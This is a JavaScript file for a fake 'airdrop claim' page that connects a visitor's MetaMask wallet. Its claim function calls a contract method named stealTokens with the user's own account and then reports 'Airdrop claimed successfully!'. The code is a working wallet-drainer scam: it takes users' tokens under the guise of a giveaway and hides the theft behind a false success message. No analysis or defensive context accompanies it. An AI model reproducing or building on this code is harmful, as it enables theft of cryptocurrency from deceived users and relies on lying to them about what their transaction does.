// Function to connect to the Ethereum network
async function connectEthereum() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log("Connected accounts:", accounts);

            // Enable the claim button once connected
            document.getElementById('claimAirdropButton').disabled = false;

            // Optionally, disable the connect button
            const connectButton = document.getElementById('connectButton');
            if (connectButton) {
                connectButton.disabled = true;
            }
        } catch (error) {
            alert('MetaMask connection failed. Please try again.');
            console.error('MetaMask connection error:', error);
        }
    } else {
        alert("MetaMask is not installed. Please install MetaMask to continue.");
    }
}

// Function to claim the airdrop
async function claimEthereumAirdrop() {
    if (!accounts || accounts.length === 0) {
        alert('Please connect to MetaMask first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details are not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop.');
        console.error('Claim error:', error);
    }
}

